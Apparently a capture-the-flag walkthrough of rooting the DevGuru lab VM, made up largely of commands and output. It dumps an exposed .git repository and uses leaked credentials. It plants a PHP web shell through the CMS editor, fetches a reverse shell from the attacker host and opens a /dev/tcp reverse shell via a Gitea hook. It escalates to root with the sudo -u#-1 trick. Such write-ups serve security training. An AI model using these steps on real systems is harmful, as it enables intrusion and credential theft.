@@ -1,0 +1,314 @@
+─$ nmap -sSCV -p 22,80,8585 192.168.71.98
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 10:12 EDT
+Nmap scan report for 192.168.71.98
+Host is up (0.00054s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
+|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
+|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: DevGuru
+|_http-title: Corp - DevGuru
+| http-git: 
+|   192.168.71.98:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: first commit 
+|     Remotes:
+|       http://devguru.local:8585/frank/devguru-website.git
+|_    Project type: PHP application (guessed from .gitignore)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+8585/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gitea=1f94da45e9d887ec; Path=/; HttpOnly
+|     Set-Cookie: _csrf=aSjunsHAjU_yhy7CFr1OjFjDNSE6MTc0NDQ2NzE1NDUwMTUwNzU3NA; Path=/; Expires=Sun, 13 Apr 2025 14:12:34 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 12 Apr 2025 14:12:34 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-">
+|     <head data-suburl="">
+|     <meta charset="utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta http-equiv="x-ua-compatible" content="ie=edge">
+|     <title> Gitea: Git with a cup of tea </title>
+|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
+|     <meta name="theme-color" content="#6cc644">
+|     <meta name="author" content="Gitea - Git with a cup of tea" />
+|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gitea=10bb201cf58040c4; Path=/; HttpOnly
+|     Set-Cookie: _csrf=Sw3hGUKbgDCeu6ns7HOd-cpNGDE6MTc0NDQ2NzE1NDU4MDkxODc4Mw; Path=/; Expires=Sun, 13 Apr 2025 14:12:34 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 12 Apr 2025 14:12:34 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-">
+|     <head data-suburl="">
+|     <meta charset="utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta http-equiv="x-ua-compatible" content="ie=edge">
+|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
+|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
+|     <meta name="theme-color" content="#6cc644">
+|     <meta name="author" content="Gitea - Git with a cup of tea" />
+|_    <meta name="description" content="Gitea (Git with a c
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8585-TCP:V=7.94SVN%I=7%D=4/12%Time=67FA74D2%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(GetRequest,2A00,"HTTP/1\.0\x20200\x20OK\r\nContent-Typ
+SF:e:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path
+SF:=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=1f94da45e9d887
+SF:ec;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=aSjunsHAjU_yhy7CFr1O
+SF:jFjDNSE6MTc0NDQ2NzE1NDUwMTUwNzU3NA;\x20Path=/;\x20Expires=Sun,\x2013\x2
+SF:0Apr\x202025\x2014:12:34\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAM
+SF:EORIGIN\r\nDate:\x20Sat,\x2012\x20Apr\x202025\x2014:12:34\x20GMT\r\n\r\
+SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<hea
+SF:d\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=
+SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t
+SF:<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<tit
+SF:le>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<l
+SF:ink\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"us
+SF:e-credentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\
+SF:">\n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20con
+SF:tent=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20
+SF:painless")%r(HTTPOptions,212A,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCont
+SF:ent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\
+SF:x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=10bb201
+SF:cf58040c4;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=Sw3hGUKbgDCeu
+SF:6ns7HOd-cpNGDE6MTc0NDQ2NzE1NDU4MDkxODc4Mw;\x20Path=/;\x20Expires=Sun,\x
+SF:2013\x20Apr\x202025\x2014:12:34\x20GMT;\x20HttpOnly\r\nX-Frame-Options:
+SF:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2012\x20Apr\x202025\x2014:12:34\x20GMT
+SF:\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\"
+SF:>\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x
+SF:20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1
+SF:\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\
+SF:n\t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x20a\x
+SF:20cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/
+SF:manifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20name=\
+SF:"theme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"\x20c
+SF:ontent=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/>\n\t
+SF:<meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\x20a\
+SF:x20c");
+MAC Address: 08:00:27:C7:69:C6 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+─$ sudo dirsearch -u http://192.168.71.98
+[sudo] password for ed: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/ed/reports/http_192.168.71.98/_25-04-12_10-20-24.txt
+
+Target: http://192.168.71.98/
+
+[10:20:24] Starting: 
+[10:20:27] 301 -  313B  - /.git  ->  http://192.168.71.98/.git/
+[10:20:27] 200 -   13B  - /.git/COMMIT_EDITMSG
+[10:20:27] 200 -  276B  - /.git/config
+[10:20:27] 200 -   23B  - /.git/HEAD
+[10:20:27] 200 -   73B  - /.git/description
+[10:20:27] 200 -  308KB - /.git/index
+[10:20:27] 200 -  240B  - /.git/info/exclude
+[10:20:27] 200 -  158B  - /.git/logs/HEAD
+[10:20:27] 301 -  323B  - /.git/logs/refs  ->  http://192.168.71.98/.git/logs/refs/
+[10:20:27] 200 -  158B  - /.git/logs/refs/heads/master
+[10:20:27] 301 -  329B  - /.git/logs/refs/heads  ->  http://192.168.71.98/.git/logs/refs/heads/
+[10:20:27] 301 -  331B  - /.git/logs/refs/remotes  ->  http://192.168.71.98/.git/logs/refs/remotes/
+[10:20:27] 301 -  338B  - /.git/logs/refs/remotes/origin  ->  http://192.168.71.98/.git/logs/refs/remotes/origin/
+[10:20:27] 200 -  142B  - /.git/logs/refs/remotes/origin/master
+[10:20:27] 200 -   41B  - /.git/refs/heads/master
+[10:20:27] 301 -  324B  - /.git/refs/heads  ->  http://192.168.71.98/.git/refs/heads/
+[10:20:27] 301 -  333B  - /.git/refs/remotes/origin  ->  http://192.168.71.98/.git/refs/remotes/origin/
+[10:20:27] 301 -  326B  - /.git/refs/remotes  ->  http://192.168.71.98/.git/refs/remotes/
+[10:20:27] 200 -   41B  - /.git/refs/remotes/origin/master
+[10:20:27] 301 -  323B  - /.git/refs/tags  ->  http://192.168.71.98/.git/refs/tags/
+[10:20:27] 200 -  413B  - /.gitignore
+[10:20:27] 404 -  275B  - /.gitignore/
+[10:20:27] 200 -    2KB - /.htaccess
+[10:20:27] 404 -  275B  - /.htaccess/
+[10:20:35] 200 -    3KB - /About
+[10:20:35] 200 -    3KB - /about
+[10:20:44] 200 -    2KB - /adminer.php
+[10:20:49] 302 -  410B  - /backend/  ->  http://192.168.71.98/backend/backend/auth
+[10:20:54] 301 -  315B  - /config  ->  http://192.168.71.98/config/
+[10:21:07] 200 -    3KB - /index.php
+[10:21:15] 301 -  316B  - /modules  ->  http://192.168.71.98/modules/
+[10:21:23] 301 -  316B  - /plugins  ->  http://192.168.71.98/plugins/
+[10:21:26] 200 -    1KB - /README.md
+[10:21:29] 200 -    0B  - /server.php
+[10:21:29] 200 -    2KB - /services
+[10:21:29] 200 -    2KB - /services/
+[10:21:33] 301 -  316B  - /storage  ->  http://192.168.71.98/storage/
+[10:21:36] 301 -  315B  - /themes  ->  http://192.168.71.98/themes/
+
+http://192.168.71.98/.git/logs/HEAD
+0000000000000000000000000000000000000000 7de9115700c5656c670b34987c6fbffd39d90cf2 frank <frank@devguru.local> 1605832923 -0600	commit (initial): first commit
+
+http://192.168.71.98/adminer.php
+
+    Adminer 4.7.7 5.2.1
+
+//as a .git repo, use gittool, dumper to find all git file, and extractor to get all files.
+// under the extracted folder, in a database.php file, 
+        'mysql' => [
+            'driver'     => 'mysql',
+            'engine'     => 'InnoDB',
+            'host'       => 'localhost',
+            'port'       => 3306,
+            'database'   => 'octoberdb',
+            'username'   => 'october',
+            'password'   => 'SQ66EBYx4GT3byXH',
+            'charset'    => 'utf8mb4',
+            'collation'  => 'utf8mb4_unicode_ci',
+            'prefix'     => '',
+            'varcharmax' => 191,
+        ],
+
+http://192.168.71.98/adminer.php?username=october&db=octoberdb
+
+select backend_users 
+    frank	frank@devguru.local	$2y$10$sXAfwpQoAKFDpUOzMD4zzexeoc1BC4nOh7/tTasPBiPbqm6w5OvvC
+    //we edit the passwd by generate a new one by bcrypt hash.
+//then login http://192.168.71.98/backend
+
+ //under http://192.168.71.98/backend/cms#secondarytab-cmslangeditormarkup
+//we ADD a fuile named 'sh', what is the type of this sort of file????
+//Markup,
+    {{ page.this.myVar }}
+//Code
+function onStart()
+{
+    $this->page["myVar"] = shell_exec($_GET['cmd']);
+}
+
+view-source:http://192.168.71.98/sh?cmd=cat%20/etc/passwd
+
+    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+    pollinate:x:110:1::/var/cache/pollinate:/bin/false
+    frank:x:1000:1000:,,,:/home/frank:/bin/bash
+//it seems cmd parameter works here. we can search for the config file of gitea, which is a service we never touched. And other sensitice files.
+
+GET /sh?cmd=ls%20-la%20/var/www/html 
+total 420
+drwxr-xr-x 10 www-data www-data   4096 Nov 19  2020 .
+drwxr-xr-x  3 root     root       4096 Nov 18  2020 ..
+drwxr-xr-x  8 root     root       4096 Nov 19  2020 .git
+-rw-r--r--  1 root     root        413 Nov 18  2020 .gitignore
+-rw-r--r--  1 www-data www-data   1678 Nov 18  2020 .htaccess
+-rw-r--r--  1 www-data www-data   1518 Nov 18  2020 README.md
+-rw-r--r--  1 www-data www-data 362514 May 11  2020 adminer.php
+-rw-r--r--  1 www-data www-data   1640 Nov 18  2020 artisan
+drwxr-xr-x  2 www-data www-data   4096 Nov 18  2020 bootstrap
+drwxr-xr-x  2 www-data www-data   4096 Nov 18  2020 config
+-rw-r--r--  1 www-data www-data   1173 Nov 18  2020 index.php
+drwxr-xr-x  5 www-data www-data   4096 Nov 18  2020 modules
+drwxr-xr-x  3 www-data www-data   4096 Nov 18  2020 plugins
+-rw-r--r--  1 www-data www-data    551 Nov 18  2020 server.php
+drwxr-xr-x  7 www-data www-data   4096 Nov 18  2020 storage
+drwxr-xr-x  4 www-data www-data   4096 Nov 18  2020 themes
+drwxr-xr-x 31 www-data www-data   4096 Nov 18  2020 vendor
+
+//use wget to download php reverse shell file to server, of course set a python server on host.
+http://192.168.71.98/sh?cmd=wget%20http://192.168.71.99:8000/php-reverse-shell.php
+
+//then visit the reverse shell
+http://192.168.71.98/php-reverse-shell.php
+
+www-data@devguru:/var/backups$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@devguru:/var/backups$ cat app.ini.bak
+//insde of this file, we found the gitea db.
+[database]
+; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
+DB_TYPE             = mysql
+HOST                = 127.0.0.1:3306
+NAME                = gitea
+USER                = gitea
+; Use PASSWD = `your password` for quoting if you use special characters in the password.
+PASSWD              = UfFPTF8C8jjxVF2m
+
+//login in the backend web side, change the frank to bcrypt type hash same as the previous one.
+MariaDB [gitea]> select * from user;
+     1 | frank      | frank |           | frank@devguru.local |                  0 | enabled                        | c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900 | pbkdf2           | 
+//we can login 8585 port of gitea,
+//under gitea seting tag, we edit the githook content to, update or pre-receive files both works for us.
+    /bin/sh -i >& /dev/tcp/192.168xx/8822 0>&1
+
+└─$ nc -nvlp 8822
+listening on [any] 8822 ...
+
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c "import pty; pty.spawn('/bin/bash')"
+/bin/sh: 1: python: not found
+$ python3 -c "import pty; pty.spawn('/bin/bash')"
+frank@devguru:~/gitea-repositories/frank/devguru-website.git$ ls
+ls
+HEAD  branches	config	description  hooks  info  objects  refs
+frank@devguru:~/gitea-repositories/frank/devguru-website.git$ id
+id
+uid=1000(frank) gid=1000(frank) groups=1000(frank)
+frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo -l
+sudo -l
+Matching Defaults entries for frank on devguru:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User frank may run the following commands on devguru:
+    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
+
+
+frank@devguru:/home/frank$ cat user.txt
+cat user.txt
+22854d0aec6ba776f9d35bf7b0e00217
+
+
+<ta/data/queues/notification-service$ sudo --version             
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+frank@devguru:/home/frank/data/data/queues/notification-service$ sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'
+<vice$ sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'             
+# id
+id
+uid=0(root) gid=1000(frank) groups=1000(frank)
+# cd /root
+cd /root
+# ls 
+ls
+msg.txt  root.txt
+# cat msg.txt 
+cat msg.txt
+
+	   Congrats on rooting DevGuru!
+  Contact me via Twitter @zayotic to give feedback!
+
+
+# cat root.txt
+cat root.txt
+96440606fb88aa7497cde5a8e68daf8f
+
